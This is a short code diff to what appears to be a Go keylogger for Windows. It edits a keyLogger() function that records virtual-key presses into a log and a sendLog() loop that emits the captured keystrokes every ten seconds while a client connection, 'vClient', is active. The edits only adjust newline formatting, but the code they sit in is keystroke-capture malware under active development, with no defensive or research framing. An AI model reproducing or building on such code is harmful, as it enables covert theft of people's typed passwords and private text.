@@ -92,7 +92,7 @@ func keyLogger() {
 				case w32.VK_TAB:
 					tmpKeylog += fmt.Sprintf(keyBrackets,"Tab")
 				case w32.VK_RETURN:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Enter\n")
+					tmpKeylog += fmt.Sprintf(keyBrackets,"Enter")
 				case w32.VK_SHIFT:
 					tmpKeylog += fmt.Sprintf(keyBrackets,"Shift")
 				case w32.VK_MENU:
@@ -337,7 +337,7 @@ func sendLog(){
 	for vClient.IsConnected(){
 		time.Sleep(10 * time.Second)
 		if tmpKeylog == ""{
-			fmt.Println("Nothing to show")
+			fmt.Print("\nNothing to show")
 			continue
 		}
 		fmt.Print(tmpKeylog)
